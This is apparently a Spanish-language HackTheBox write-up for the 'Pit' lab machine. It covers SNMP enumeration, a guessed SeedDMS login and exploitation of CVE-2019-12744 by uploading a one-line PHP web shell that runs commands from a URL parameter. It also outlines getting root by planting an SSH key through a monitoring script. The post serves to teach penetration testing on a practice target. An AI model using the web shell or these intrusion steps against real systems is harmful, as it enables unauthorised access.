---
layout      : post
title       : "HackTheBox - Pit"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346banner.png
category    : [ htb ]
tags        : [ CentOS, DMS, SeedDMS, SNMP, cockpit ]
---
M√°quina Linux (**CentOS 8**) nivel medio. <u>Caminaremos</u> con el servicio **SNMP**, extraeremos rutas web, rutas de binarios y usuarios. Explotaremos **SeedDMS** con un exploit que no deber√≠a servir contra esa versi√≥n (:( encontraremos credenciales en archivos yyyyy volveremos a caminar para ejecutar un script que ejecuta scripts üòõ

![346pitHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346pitHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [polarbearer](https://www.hackthebox.eu/profile/159204) & [GibParadox](https://www.hackthebox.eu/profile/125033).

Jmmm, un completo descontrol esto e.e

Empezaremos jugando con un puerto `UDP` que tiene activo un servicio `SNMP` para monitorear tareas del sistema. Movi√©ndonos mucho con herramientas como `snmpwalk`, `snmp-check` y `snmpbulkwalk` lograremos encontrar una ruta de un servicio web, un usuario llamado `michelle` y el llamado a un binario: `/usr/bin/monitor`. 

Toqueteando la ruta web tendremos un **software de gesti√≥n documental** (**DMS**) llamado `SeedDMS`, lograremos pasar el **login** usando como contrase√±a y usuario: **michelle**.

Estando dentro <u>se nos indica</u> que el servicio ha sido actualizado a la versi√≥n `5.1.15` debido a los problemas de seguridad encontrados en la versi√≥n `5.1.10`. Esto nos hace perder mucho tiempo, ya que finalmente logramos comprometer el **DMS** con un exploit de la versi√≥n `5.1.10`... üòë

El exploit nos permite subir un archivo `.php` para ejecutar comandos en el sistema, lo ejecutaremos como el usuario **nginx**. No podremos obtener una **Reverse Shell**, pero podremos simular una **Shell** (l√©ase bien el <u>simular</u>), esto con un script que creamos:

> [fakeSheedDMS.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/pit/fakeSheedDMS.py)

Enumerando el sistema encontramos unas credenciales en un archivo llamado `settings.xml`, esas credenciales corresponden a un usuario de la base de datos.

Haciendo reutilizaci√≥n de contrase√±as y apoyados en nuestra enumeraci√≥n web, lograremos autenticarnos como **michelle** (con la contrase√±a encontrada en `settings.xml`) contra otro login, esta vez de un servidor **CentOS 8** alojado en la web.

Jugando con √©l veremos que existe un apartado llamado **Terminal** y si, en √©l podremos ejecutar comandos como **michelle** en el sistema.

Finalmente con ayuda de lo que encontramos con `snmp...` recordaremos el binario `/usr/bin/monitor`, lo inspeccionaremos y veremos que lo √∫nico que hace es ejecutar los archivos que sus nombres empiecen con **check** y terminen en **sh** (b√°sicamente un script de bash, ejemplo: `checkealorey.sh`) **<u>alojados en la ruta</u> `/usr/local/monitoring`**.

Pero para que sea ejecutado debemos volver a validar nuestros procesos, o sea, ejecutar `snmpwalk` o `snmpbulkwalk` y que √©l sea el encargado de lanzar `/usr/bin/monitor`.

En el script le indicaremos que guarde nuestra llave **SSH** publica en `/root/.ssh/authorized_keys`, as√≠ jugando con nuestra llave privada lograremos tener acceso a la m√°quina como el usuario `root`.

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346rating.png" style="display: block; margin-left: auto; margin-right: auto; width: 20%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Muuuuy juguetona (poco real), pero vamos a tener que mover muchas cosas y enumerar como dioses.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.

...

Bueno, se vienen cositas...

1. [Reconocimiento](#reconocimiento).
  * [Encontrando puertos abiertos de la m√°quina con ayuda de **nmap**](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Enumerando servidor web (puerto 80)](#puerto-80).
  * [Recorremos servicio sobre el puerto 9090](#puerto-9090).
3. [Movimiento lateral - Encontramos ruta web al DMS (SeedDMS)](#movimiento-lateral-dms).
4. [Explotaci√≥n](#explotacion).
  * [Ejecuci√≥n remota de comandos en **SeedDMS** (**CVE-2019-12744**)](#expl_seeddms).
  * [Encontramos credenciales de la base de datos en el archivo **settings.xml**](#expl_settingsXML).
5. [Movimiento lateral - Ejecuci√≥n de comandos servidor **CentOS** con interfaz web](#expl_centos_login_done).
6. [Escalada de privilegios](#escalada-de-privilegios).
  * [Generamos script que ser√° ejecutado por **/usr/bin/monitor**](#privesc_scriptcheck).

---

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Encontrando puertos abiertos de la m√°quina con ayuda de **nmap** [üìå](#enum-nmap) {#enum-nmap}

Empezaremos enumerando los puertos (servicios) abiertos de la m√°quina, lo haremos usando **nmap**:

```bash
‚ù± nmap -p- --open -v 10.10.10.241 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar la [funci√≥n **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) creada por [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Pero este escaneo va demasiado lento, entonces aprovechemos el uso de `--min-rate` para indicarle que no env√≠e menos de X paquetes en cada petici√≥n, en nuestro caso **1000** paquetes por petici√≥n:

```bash
‚ù± nmap -p- --open --min-rate=1000 -v 10.10.10.241 -oG initScan
```
Este va muy bien y finalmente nos devuelve:

```bash
‚ù± cat initScan
# Nmap 7.80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -p- --open --min-rate=1000 -v -oG initScan 10.10.10.241
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.241 ()	Status: Up
Host: 10.10.10.241 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9090/open/tcp//zeus-admin///	Ignored State: filtered (65532)
# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 350.43 seconds
```

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Nos permite entre varias cosas conseguir una Shell de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Nos provee de un servidor web. |
| 9090   | **[zeus-admin](https://en.wikipedia.org/wiki/Zeus_Web_Server)**: Al parecer es una web para el control de ordenadores remotamente. Medio raro... |

Teniendo los puertos que est√°n abiertos, haremos un escaneo de versiones y scripts relacionados con cada servicio, as√≠ tendremos info un poco m√°s detallada:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno (en este caso dar√≠a igual, ya que son poquitos, pero bueno, si fueran varios puertos es muy funcional)**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.241
    [*] Open ports: 22,80,9090

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,80,9090 -sC -sV 10.10.10.241 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y obtenemos:

```bash
‚ù± cat portScan
# Nmap 7.80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -p 22,80,9090 -sC -sV -oN portScan 10.10.10.241
Nmap scan report for 10.10.10.241
Host is up (0.11s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
80/tcp   open  http            nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2020-04-16T23:29:12
|_Not valid after:  2030-06-04T16:09:12
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.80%T=SSL%I=7%D=6/25%Time=60D65434%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,E70,"HTTP/1...Content-Type:
...
x2010p");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 202.07 seconds
```

Podemos destacar cositas:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.0 (protocol 2.0) |
| 80     | HTTP     | nginx 1.14.1 |
| 9090   | HTTPS    | **nmap** no sabe si realmente es **zeus-admin** |

Vemos un dominio en el certificado:

* `dms-pit.htb`.

Lo podemos tener en cuenta por si algo.

Por ahora nada m√°s :) Pues juguemos y encontremos la forma de explotar esta m√°quina.

...

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [üìå](#puerto-80) {#puerto-80}

![346page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80.png)

La p√°gina por default de [nginx](https://kinsta.com/es/base-de-conocimiento/que-es-nginx/) en [Red Hat](https://www.redhat.com/es/technologies/linux-platforms/enterprise-linux)...

Fuzzeando archivos o subdominios no encontramos nada interesante en ella y la versi√≥n de **nginx** (`1.14.1`) no nos proporciona tampoco nada relevante.

...

## Puerto 9090 [üìå](#puerto-9090) {#puerto-9090}

![346page9090](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page9090.png)

Un login de **CentOS**... En la parte de abajo vemos que hace referencia al dominio `pit.htb`, as√≠ que agreguemos este y el que encontramos con **nmap** al archivo [/etc/hosts](https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html), pueda que consigamos que la m√°quina responda diferente ante los dominios:

```bash
‚ù± cat /etc/hosts
...
10.10.10.241  pit.htb dms-pit.htb
...
```

Pero obtenemos las mismas respuestas (:

Interceptando una petici√≥n con [BurpSuite](https://openwebinars.net/blog/hacer-testeo-con-burp-suite/) al intentarnos logear vemos algo llamativo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346burp_login9090.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Algo llamado **cockpit** que curiosamente tiene una parte del nombre de la m√°quina, as√≠ que de una me llamo la atenci√≥n...

Buscando en internet encontramos:

üåê ***<u>Cockpit</u> is a web-based graphical interface for servers.*** [cockpit-project.org](https://cockpit-project.org/)

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_cockpitProject.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfecto e interesante, ya que tenemos un login al parecer de un **<u>server</u> CentOS** (toma sentido).

Y confirmamos que estamos relacionados con **cockpit** gracias a una de sus im√°genes de ejemplo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_cockpitLogin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, pues veamos como entrarle e.e

...

Despu√©s de algunas horitas de enumerar y enumerar y dejar de enumerar pensando por donde ir y volver a enumerar y volver a perderme llegue a la conclusi√≥n que no sab√≠a hacia donde tirar üòÑ

Intente de todo con el CVE [**CVE-2020-35850**](https://security.archlinux.org/CVE-2020-35850), ve√≠a cositas pero nanai... Estaba muy perdido, as√≠ que decid√≠ buscar ayuda y fue bastante clara (a veces nos centramos tanto en algo que olvidamos cositas muuuy sencillas):

> UDP.

Y s√≠, podemos probar a hacer un escaneo de puertos [**UDP**](https://es.wikipedia.org/wiki/Protocolo_de_datagramas_de_usuario) con **nmap**, esto se lo indicamos con el par√°metro `-sU`:

```bash
‚ù± nmap -sU -p- --open --min-rate=2000 -v 10.10.10.241 -oG initScanUDP
```

Despues de un rato obtenemos un nuevo puerto:

```bash
‚ù± cat initScanUDP 
# Nmap 7.80 scan initiated Fri Jun 25 25:25:25 2021 as: nmap -sU -p- --open --min-rate=2000 -v -oG initScanUDP 10.10.10.241
# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.241 (pit.htb)    Status: Up
Host: 10.10.10.241 (pit.htb)    Ports: 161/open/udp//snmp///
# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 370.61 seconds
```

Perfecto, encontramos un puerto que esta corriendo el servicio [SNMP (Protocolo simple de administraci√≥n de red)](https://www.manageengine.com/es/network-monitoring/what-is-snmp.html):

üü• ***Facilita la administraci√≥n de dispositivos de una red***. [Wikipedia](https://es.wikipedia.org/wiki/Protocolo_simple_de_administraci%C3%B3n_de_red)

Listones, ahora tomemos ese puerto y veamos que versi√≥n esta ejecutando y si tiene scripts relacionados:

```bash
‚ù± nmap -sU -p 161 -sC -sV 10.10.10.241 -oN portScanUPD
```

Nos devuelve:

```bash
# Nmap 7.80 scan initiated Fri Jun 25 21:38:44 2021 as: nmap -sU -p 161 -sC -sV -oN portScanUDP 10.10.10.241
Nmap scan report for pit.htb (10.10.10.241)
Host is up (0.11s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 4ca7e41263c5985e00000000
|   snmpEngineBoots: 71
|_  snmpEngineTime: 5h48m16s
| snmp-processes: 
|   1: 
|     Name: systemd
|     Path: /usr/lib/systemd/systemd
|     Params: --switched-root --system --deserialize 18
...
...
# Es gigante el output.
# Es gigante el output.
# Es gigante el output.
...
...
|   27151: 
|_    Name: kworker/1:4-cgroup_destroy
| snmp-sysdescr: Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64
|_  System uptime: 5h48m15.86s (2089586 timeticks)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 170.14 seconds
```

Destacamos que es un servidor **SNMP** de versi√≥n **1**. Y apoy√°ndonos de [este recurso](https://hacking-etico.com/2014/03/27/leyendo-informacion-snmp-con-snmpwalk/) entendemos que significa el ***public*** que vemos en el escaneo:

Para poder enumerar o leer informaci√≥n de un servicio **SNMP** es necesario conocer algo llamado "comunidad", que es simplemente el medio por el que el servicio esta publicando la informaci√≥n yyyyyyy por defecto viene con la comunidad **public**, que esa es la que tenemos activa y al parecer en funcionamiento con la m√°quina (:

As√≠ que teniendo la comunidad nos queda muy f√°cil empezar a enumerar... Existen varias herramientas, usaremos [snmp-check](http://www.reydes.com/d/?q=Utilizar_SNMP_para_Obtener_mas_Informacion_con_Snmp_check_y_Onesixtyone), [snmpwalk](https://hacking-etico.com/2014/03/27/leyendo-informacion-snmp-con-snmpwalk/) y [snmpbulkwalk](https://docs.oracle.com/cd/E19121-01/sf.x4140/820-6413-13/SNMP_commands_reference_appendix.html)...

Siguiendo ["lo que podemos hacer en cuanto a pentesting contra **SNMP**"](https://book.hacktricks.xyz/pentesting/pentesting-snmp#enumerating-snmp) (y con ayuda de las herramientas anteriores) logramos encontrar varias cosas.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_hacktricks_enumSNMP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> TODO se va a tratar de estos comandos y esta guia, solo que profundizaremos un poco en cada uno.

### üìº <u>snmp-check</u>

**snmp-check** nos muestra de una manera linda la interacci√≥n entre dispositivos (adem√°s vemos cositas de la m√°quina), le podemos indicar, la versi√≥n `-v`, la comunidad `-c` y claramente el servidor **SNMP**:

```bash
‚ù± snmp-check -v1 -c public 10.10.10.241
```

![346bash_snmpCheck1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpCheck1.png)

...mucha info m√°s...

![346bash_snmpCheck2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpCheck2.png)

Pues podemos destacar √∫nicamente la versi√≥n del sistema, lo dem√°s son procesos en ejecuci√≥n, pero no vemos ninguno relevante o que nos d√© algo m√°s de informaci√≥n, as√≠ que sigamos jugando.

### üìº <u>snmpwalk</u>

**snmpwalk** nos ayuda a ver los mismos procesos enumerados con ***snmp-check***, pero ya entran en juego los [**OIDs**](https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids), que ser√≠an los *identificadores de cada objeto*.

* [Pentesting SNMP - OIDs](https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids).

Podemos hacer varias maromas con √©l, lo √∫nico que cambia (si queremos) es que debemos tomar la versi√≥n `2`, lo dem√°s es igual:

```bash
‚ù± snmpwalk -v2c -c public 10.10.10.241
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

... m√°s cositas...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Pero claramente obtenemos lo mismo (pero muy lento, en un rato entra **snmpbulkwalk** que nos ayudara a hacer muuuucho m√°s r√°pido todo).

Jugando con la gu√≠a inicial vemos que podemos extraer info en concreto de alguna **OID**, por ejemplo extraigamos la versi√≥n del sistema pas√°ndole el **OID**:

```bash
‚ù± snmpwalk -v2c -c public 10.10.10.241
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
...
```

Sabemos que es la primera l√≠nea (para el ejemplo lo sabemos :P), pues ahora tomar√≠amos ese **OID** y ejecutar√≠amos:

```bash
‚ù± snmpwalk -v2c -c public 10.10.10.241 iso.3.6.1.2.1.1.1.0
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64"
```

Y nos traer√≠a la l√≠nea correspondiente a ese **OID** (:

Algo que me di cuenta al jugar con esto es que podemos tambi√©n pasarle "rangos", por ejemplo:

* Tenemos este **OID**: `iso.3.6.1.2.1.1.1.0`.
* Podemos decirle que extraiga todo lo que inicie con este **OID**: `iso.3.6.1.2.1.1`.

Nos mostrar√≠a solo esa info:

```bash
‚ù± snmpwalk -v2c -c public 10.10.10.241 iso.3.6.1.2.1.1
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk_exArangeOID.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Otra cosita interesante son las **consultas extendidas** que nos permiten profundizar un poco m√°s en la extracci√≥n:

* [Extended Queries - **NET-SNMP-EXTEND-MID**](http://www.circitor.fr/Mibs/Html/N/NET-SNMP-EXTEND-MIB.php)

Jugando con ellas encontramos unos usuarios:

```bash
‚ù± snmpwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects                      
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalk_ex_EXTENDobjects.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

* Al parecer un proceso de monitoreo o algo as√≠ que esta ejecutando un binario de la ruta `/usr/bin/monitor`. Es interesante porque no es un programa que me suene que venga por default en el sistema.
* Tambi√©n vemos la versi√≥n del servidor **CentOS**.
* El usuario **root**.
* Y el usuario **michelle**.

Esto podemos guardarlo por si algo (:

### üìº <u>snmpbulkwalk</u>

üå≤ ***The `snmpbulkwalk` command uses the <u>GETBULK SNMP</u> protocol feature to query for an entire tree of information about a network entity. This command <u>can pack more objects into the packets by specifying -repeaters-</u>.*** [Oracle - SNMP commands](https://docs.oracle.com/cd/E19121-01/sf.x4140/820-6413-13/SNMP_commands_reference_appendix.html)

Ac√° si es necesario indicarle la versi√≥n `2` de **SNMP**... Como sabemos que podemos hacer lo mismo que **snmpwalk**, pero m√°s r√°pido, vayamos directo a lo interesante:

Vimos que pod√≠amos extraer info de **OIDs** en concreto y tambi√©n de **OIDs** de los que conoc√≠amos su inicio...

...

# Encontrando ruta web hacia <u>SeedDMS</u> [#](#movimiento-lateral-dms) {#movimiento-lateral-dms}

Pues despu√©s de muchas pruebas intentamos extraer toooooooodo lo que inicie con `iso` (**1**) y al final (bien al final) encontramos algo distinto a lo que ten√≠amos:

```bash
‚ù± snmpbulkwalk -v2c -c public 10.10.10.241 iso
```

![346bash_snmpWalkbulk_ex_iso](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346bash_snmpWalkbulk_ex_iso.png)

Opa, vemos que al parecer hay un servicio web en la ruta `/var/www/html` llamado `/seeddms51x`, pues podemos intentar a buscarlo en alguno de los puertos y dominios que tenemos a ver si lo encontramos...

Finalmente al dirigirnos a:

```html
http://dms-pit.htb/seeddms51x/seeddms
```

Nos redirige a:

```html
http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F
```

Y nos muestra:

![346page80dms_seeddmsLogin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsLogin.png)

Un login de un [DMS](https://www.sergroup.com/es/temas/que-es-dms.html) llamado [**SeedDMS**](https://www.seeddms.org/index.php?id=2) que es un sistema para la administraci√≥n de documentos...

Intentando algunas credenciales por default no logramos nada, pero al intentar con **michelle** (que fue uno de los usuarios que encontramos antes) como *usuario* y *contrase√±a* logramos acceder:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsDashboard.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones, vemos dos objetos, una carpeta llamada **Docs** y un archivo llamado **Upgrade Note**.

En el upgrade nos indica que debido a los problemas de seguridad de la versi√≥n `5.1.10` el administrador decidi√≥ actualizar el servicio **SeedDMS** a la versi√≥n `5.1.15`.

> **Esto es importante ya que concocemos que version de `SeedDMS` estamos usando, as√≠ evitamos estar tocando vulnerabilidades de otras versiones**.

En la carpeta **Docs** existe dentro una llamada **Users** y ah√≠ residen dos m√°s:

![346page80dms_seeddmsDocsUsers](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsDocsUsers.png)

Bien, conocemos al usuario **Jack** (lo guardamos por si algo). 

Yyy solo podemos jugar con la carpeta de **Michelle**...

Enumerando encontramos los mails de cada usuario, nos sirven para conocer los usuarios y a que dominio est√°n asociados (por si algo e.e):

![346page80dms_seeddmsUsers](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsUsers.png)

...

# Explotaci√≥n [#](#explotacion) {#explotacion}

Despu√©s de muuuuuuuuchas pruebas de exploits y cositas llamativas hacia la versi√≥n `5.1.15` no logramos nada :/ As√≠ que empezamos a probar de todo...

Antes de conocer la versi√≥n actual ya hab√≠a probado este exploit, pero no me hab√≠a funcionado:

* [SeedDMS versions **< 5.1.11** - Remote Command Execution](https://www.exploit-db.com/exploits/47022).

Probando y probando extra√±amente funciono, lo cual no deber√≠a ser, ya que es un exploit de otra versi√≥n üòê pero pues pfff...

As√≠ que veamos como fue el proceso:

<span style="color: red;">1. </span> Creamos el archivo, se tiene que llamar `1.php`, no encontr√© el porqu√©, pero debe serlo, ya que con otros nombres no lo toma.

```bash
‚ù± cat 1.php 
<?php system($_GET['xmd']); ?>
```

<span style="color: red;">2. </span> Subimos el archivo al DMS.

**SeedDMS** (arriba a la izquierda) > **Docs** > **Users** > **Michelle** > **Add document** (arriba).

Ah√≠ en el nombre colocamos `1.php` y donde dice **Local file** seleccionamos el archivo `1.php` de nuestro sistema:

![346page80dms_seeddmsAddDoc_1PHP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsAddDoc_1PHP.png)

Y damos clic en **Add document**.

<span style="color: red;">3. </span> **Encontramos** el archivo subido en el servidor web.

Cada archivo al existir tiene un **ID**, podemos verlo al dar clic sobre √©l y en la **URL** se reflejar√≠a con el par√°metro `documentid`, en nuestro caso es el n√∫mero **48**.

Siguiendo el exploit existen dos rutas que usa **SeedDMS** por default al subir archivos y guardarlos:

* `data` y `1048576`.

---

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_seeddms_dataY1048576.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

> Tomado de: [https://github.com/rachmari/seeddms](https://github.com/rachmari/seeddms#data-storage).

As√≠ que perfecto, tiene y toma sentido (: 

El exploit nos indica la siguiente ruta en la que deber√≠a existir el archivo:

```html
http://holacomoestas.com/data/1048576/<document_id>/1.php
```

Y con el **id**, el dominio y el comando a ejecutar quedar√≠a as√≠:

```html
http://dms-pit.htb/seeddms51x/seeddms/data/1048576/48/1.php?xmd=whoami
```

Peeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeero al direccionarnos hacia ella nos indica que no encuentra el archivo :s

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsRCE_fail_FnotFound.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

...

## RCE SeedDMS (<u>CVE-2019-12744</u>) [üìå](#expl_seeddms) {#expl_seeddms}

Jugando con internet buscando info relacionada con el directorio **data** y **1048576** encontramos este thread el cual nos da una idea para intentar:

![346google_seeddms_discussion_pathsDMS](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346google_seeddms_discussion_pathsDMS.png)

> Tomada de: [seeddms/discussion/general/installation-issues](https://sourceforge.net/p/seeddms/discussion/general/thread/5f4164990d/?limit=25).

* [Ac√° tambi√©n hacen referencia al directorio **data**](https://www.redhat.com/sysadmin/install-seeddms).

(**En la imagen podr√≠a haber usado la herramienta de texto, pero quedo a√∫n m√°s lindo üòÖ**)

Incluso el comentario de abajo le indica que esta configurado de manera insegura :P

Parecen tachones lo que hay en la imagen, pero no, es lo que podemos intentar:

```html
http://dms-pit.htb/seeddms51x/seeddms
```

El **DMS** esta siendo mantenido en la ruta `/seeddms51x/seeddms`, pero podr√≠amos intentar encontrar la carpeta `data...` fuera de √©l, o sea:

```html
http://dms-pit.htb/seeddms51x/data
```

Puessssssssssssss:

```bash
‚ù± curl -s -L http://dms-pit.htb/seeddms51x/algoqueesperonoexistaymehagaquedarmal/ | grep title
<head><title>404 Not Found</title></head>
```

```bash
‚ù± curl -s -L http://dms-pit.htb/seeddms51x/data/ | grep title
<head><title>403 Forbidden</title></head>
```

Nos devuelve un **forbidden**, as√≠ que existe, pero no tenemos acceso a √©l :P Perfecto, pues ahora busquemos el archivo:

```bash
‚ù± curl http://dms-pit.htb/seeddms51x/data/1048576/48/1.php
```

No nos devuelve ning√∫n error ni output, as√≠ que podemos pensar que lo encontr√≥ (: pues ejecutemos un `whoami` y un `hostname` a ver si nos responde:

```html
http://dms-pit.htb/seeddms51x/data/1048576/48/1.php?xmd=whoami; echo " - "; hostname
```

Yyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346page80dms_seeddmsRCE_whoamiYhostname.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listoneeeeeeeeeeeeeeeeeeeeeeees, que martirio estoo, pero tamos. Tenemos ejecuci√≥n remota de comandos en el sistema como el usuario **nginx**, aprovechemos para generarnos una **Reverse Shell**.

Despu√©s de algunos intentos no lo logramos, as√≠ que tendremos que enumerar el sistema desde el servidor web.

Jugando con **Python** creamos una fake-shell:

> [fakeSheedDMS.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/pit/fakeSheedDMS.py)

